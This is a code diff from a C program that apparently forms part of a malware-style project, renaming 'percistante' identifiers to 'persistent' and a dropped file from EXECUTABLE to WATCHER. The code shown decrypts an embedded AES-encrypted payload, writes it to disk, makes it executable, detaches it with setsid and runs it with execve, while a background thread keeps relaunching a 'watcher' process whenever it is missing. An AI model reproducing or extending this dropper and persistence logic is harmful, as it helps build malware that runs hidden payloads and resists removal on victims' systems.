@@ -24,7 +24,7 @@ void start_watcher(t_aes *aes, t_cipher_plain *cipher_plain, char **env)
 	if (set_cipher(cipher_plain, (char*)&raw, sizeof(raw))) {
 		if (decrypt_cipher_text(aes, cipher_plain)) {
 			FILE *fp = NULL;
-			if ((fp = fopen(EXECUTABLE, "wb+")) != NULL) {
+			if ((fp = fopen(WATCHER, "wb+")) != NULL) {
 				fwrite(cipher_plain->plain, sizeof(char),cipher_plain->plain_len, fp);
 				fclose(fp);
 
@@ -33,23 +33,23 @@ void start_watcher(t_aes *aes, t_cipher_plain *cipher_plain, char **env)
 				if (child_pid == 0)
 				{
 					setsid();
-					chmod(EXECUTABLE, 777);
-					char *argv[] = { EXECUTABLE, 0 };
-					execve(EXECUTABLE, (char**)&argv[0], env);
+					chmod(WATCHER, 777);
+					char *argv[] = { WATCHER, 0 };
+					execve(WATCHER, (char**)&argv[0], env);
 				}
 			}
 		}
 	}
 }
 
-static BOOL	check_percistante_process_run(void)
+static BOOL	check_persistent_process_run(void)
 {
 	char*	process[] = { "watcher", 0 };
 
 	return (processes_exists(process));
 }
 
-static BOOL	run_percistante_process(char **env)
+static BOOL	run_persistent_process(char **env)
 {
 	t_aes		*aes = NULL;
 
@@ -59,7 +59,7 @@ static BOOL	run_percistante_process(char **env)
 		{
 			t_cipher_plain *cipher_plain = get_cipher_plain();
 			 if (cipher_plain) {
-				printf("run_percistante_process(void);\n");
+				printf("run_persistent_process(void);\n");
 				//start_watcher(aes, cipher_plain, env);
 			}
 		}
@@ -68,27 +68,27 @@ static BOOL	run_percistante_process(char **env)
 	return TRUE;
 }
 
-static void	*percistante_process(void * p_data)
+static void	*persistent_process(void * p_data)
 {
 	char **env = (char**)p_data;
 
 	while (1)
 	{
-		if (check_percistante_process_run() == FALSE)
+		if (check_persistent_process_run() == FALSE)
 		{
-			run_percistante_process(env);
+			run_persistent_process(env);
 		}
 		usleep(1000);
 	}
 	return NULL;
 }
 
-BOOL		build_percistante_process_thread(char **env)
+BOOL		build_persistent_process_thread(char **env)
 {
 	int			ret;
 	pthread_t	thread;
 
-	ret = pthread_create(&thread, NULL, percistante_process, env);
+	ret = pthread_create(&thread, NULL, persistent_process, env);
 
 	if (ret)
 		return (FALSE);
